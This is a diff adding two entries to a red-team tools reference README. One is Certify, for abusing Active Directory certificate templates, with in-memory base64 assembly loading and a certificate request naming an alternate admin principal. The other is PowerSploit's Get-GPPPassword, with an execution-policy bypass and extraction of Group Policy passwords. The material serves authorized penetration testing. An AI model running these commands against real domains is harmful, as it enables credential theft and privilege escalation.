@@ -49,6 +49,8 @@ Some of the tools may be specifically designed for red teaming, while others are
     - [LinPEAS](#linpeas)
     - [WinPEAS](#winpeas)
     - [linux-smart-enumeration](#linux-smart-enumeration)
+    - [Certify](#certify)
+    - [Get-GPPPassword](#get-gpppassword)
 7. [Defense Evasion](#defense-evasion)
     - [Invoke-Obfuscation](#invoke-obfuscation)
 8. [Credential Access](#credential-access)
@@ -939,6 +941,86 @@ curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/d
 ```
 
 ![image](https://user-images.githubusercontent.com/100603074/192070258-2fe8727a-4b75-430d-a84e-da6605750de9.png)
+
+### [🔙](#redteam-tools)[Certify](https://github.com/GhostPack/Certify)
+
+Certify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).
+
+Certify is designed to be used in conjunction with other red team tools and techniques, such as Mimikatz and PowerShell, to enable red teamers to perform various types of attacks, including man-in-the-middle attacks, impersonation attacks, and privilege escalation attacks.
+
+**Key features of Certify:**
+ 
+- Certificate creation
+- Certificate signing
+- Certificate import
+- Certificate trust modification
+
+**Install: (Compile)** 
+
+Certify is compatible with [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Open the Certify project [.sln](https://github.com/GhostPack/Certify), choose "Release", and build.
+
+**Install: (Running Certify Through PowerShell)** 
+
+If you want to run Certify in-memory through a PowerShell wrapper, first compile the Certify and base64-encode the resulting assembly:
+
+```bash
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Certify.exe")) | Out-File -Encoding ASCII C:\Temp\Certify.txt
+```
+
+Certify can then be loaded in a PowerShell script with the following (where "aa..." is replaced with the base64-encoded Certify assembly string):
+
+```
+$CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))
+```
+
+The Main() method and any arguments can then be invoked as follows:
+
+```
+[Certify.Program]::Main("find /vulnerable".Split())
+```
+
+Full compile instructions can be found [here](https://github.com/GhostPack/Certify#compile-instructions).
+
+**Usage:** 
+
+```bash
+# See if there are any vulnerable templates
+Certify.exe find /vulnerable
+
+# Request a new certificate for a template/CA, specifying a DA localadmin as the alternate principal
+Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:VulnTemplate /altname:localadmin
+```
+
+Full example walkthrough can be found [here](https://github.com/GhostPack/Certify#example-walkthrough).
+
+![image](https://user-images.githubusercontent.com/100603074/210088651-28899ba5-cbbd-4b03-8000-068fd401476d.png)
+
+### [🔙](#redteam-tools)[Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
+
+Get-GPPPassword is a PowerShell script part of the PowerSploit toolkit, it is designed to retrieve passwords for local accounts that are created and managed using Group Policy Preferences (GPP).
+
+Get-GPPPassword works by searching the SYSVOL folder on the domain controller for any GPP files that contain password information. Once it finds these files, it decrypts the password information and displays it to the user.
+
+**Install:** 
+
+Follow the PowerSploit [installation instructions](https://github.com/A-poc/RedTeam-Tools#powersploit) from this tool sheet.
+
+```bash
+powershell.exe -ep bypass
+Import-Module PowerSploit
+```
+
+**Usage:** 
+
+```bash
+# Get all passwords with additional information
+Get-GPPPassword
+
+# Get list of all passwords
+Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
+```
+
+![image](https://user-images.githubusercontent.com/100603074/210089230-6a61579b-849d-4175-96ec-6ea75e001038.png)
 
 Defense Evasion
 ====================
